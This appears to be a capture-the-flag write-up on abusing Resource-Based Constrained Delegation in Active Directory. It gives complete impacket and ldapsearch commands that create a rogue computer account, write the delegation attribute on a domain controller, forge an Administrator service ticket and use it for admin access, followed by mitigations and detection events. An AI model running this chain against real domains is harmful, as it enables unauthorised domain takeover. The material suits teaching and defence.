# Resource-Based Constrained Delegation (RBCD)

## The Three Delegation Models

| Model | How it works | Attacker barrier |
|---|---|---|
| **Unconstrained** | Service receives the user's full TGT. Can impersonate to ANY service. | `TRUSTED_FOR_DELEGATION` flag — requires DA |
| **Constrained** | Service can impersonate only to specific SPNs defined on the account. | `msDS-AllowedToDelegateTo` — requires `SeEnableDelegationPrivilege` |
| **RBCD** | **Target service** defines who it trusts. Configured on the resource itself. | Only requires write access to a computer object |

### Why RBCD matters for attackers

RBCD is controlled by the **resource** (e.g., `DC01$`) rather than the delegating account. If an attacker can write to a computer object's `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute, they control who can impersonate users to that service — **without needing Domain Admin**.

---

## Why MachineAccountQuota Enables This

By default, `ms-DS-MachineAccountQuota = 10` means any authenticated user can:

1. **Create a computer object** in AD (e.g., `HERMESMED$`)
2. **Set a password** for it they control
3. **Use it as the trusted delegator** in the RBCD attribute

Without `MachineAccountQuota > 0`, the attack requires either:
- An existing computer account the attacker controls
- `GenericWrite` / `WriteProperty` on an existing computer object

---

## The RBCD Attribute

`msDS-AllowedToActOnBehalfOfOtherIdentity` stores a **security descriptor** (not a simple DN string) containing the SID of the account trusted to delegate.

| State | Value |
|---|---|
| Before attack | (empty) |
| After `impacket-rbcd write` | `O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-HERMESMED$)` |

The KDC reads this attribute during S4U2Proxy to determine if the requesting service is authorised to delegate.

---

## Attack Flow (Visual)

```
r.williams (Domain User)
    │
    ├── LDAP query: ms-DS-MachineAccountQuota = 10
    │
    ├── impacket-addcomputer → HERMESMED$ created
    │
    ├── impacket-rbcd → msDS-AllowedToActOnBehalfOfOtherIdentity written on DC01$
    │
    ├── impacket-getST → S4U2Self + S4U2Proxy → Administrator.ccache
    │
    └── impacket-smbclient -k → Domain Admin access to C$
```

---

## Step-by-Step Command Reference

### 1. Verify MachineAccountQuota

```bash
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\r.williams" -w 'Helpdesk01!' \
  -b "DC=ctf,DC=local" "(objectClass=domainDNS)" ms-DS-MachineAccountQuota
```

### 2. Create the rogue machine account

```bash
impacket-addcomputer -dc-ip 10.48.137.121 \
  -computer-name HERMESMED$ \
  -computer-pass 'HermesRBCD!2026' \
  ctf.local/r.williams:'Helpdesk01!'
```

Verify creation:

```bash
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\r.williams" -w 'Helpdesk01!' \
  -b "DC=ctf,DC=local" "(sAMAccountName=HERMESMED$)" sAMAccountName
```

### 3. Write the RBCD attribute

```bash
impacket-rbcd \
  -dc-ip 10.48.137.121 \
  -action write \
  -delegate-to DC01$ \
  -delegate-from HERMESMED$ \
  ctf.local/r.williams:'Helpdesk01!'
```

Verify the write:

```bash
ldapsearch -x -H ldap://10.48.137.121 -D "CTF\r.williams" -w 'Helpdesk01!' \
  -b "DC=ctf,DC=local" "(sAMAccountName=DC01$)" msDS-AllowedToActOnBehalfOfOtherIdentity
```

### 4. Obtain the impersonation ticket

```bash
impacket-getST \
  -dc-ip 10.48.137.121 \
  -spn cifs/DC01.ctf.local \
  -impersonate Administrator \
  ctf.local/HERMESMED$:'HermesRBCD!2026'
```

Output: `Administrator.ccache`

### 5. Use the ticket

```bash
export KRB5CCNAME=./Administrator.ccache
klist   # Confirm ticket is present and not expired
impacket-smbclient -k -no-pass Administrator@dc01.ctf.local
```

---

## Mitigations

| Control | Implementation |
|---|---|
| Set `ms-DS-MachineAccountQuota` to 0 | `Set-ADDomain -Identity CTF -Replace @{"ms-DS-MachineAccountQuota"="0"}` |
| Monitor Event ID 4741 | Alert on computer account creation by non-privileged users |
| Monitor Event ID 5136 | Alert on writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Restrict delegation rights | Mark sensitive accounts as "Account is sensitive and cannot be delegated" |
| Tier model | Restrict Domain Admin credentials to Tier 0 assets only |
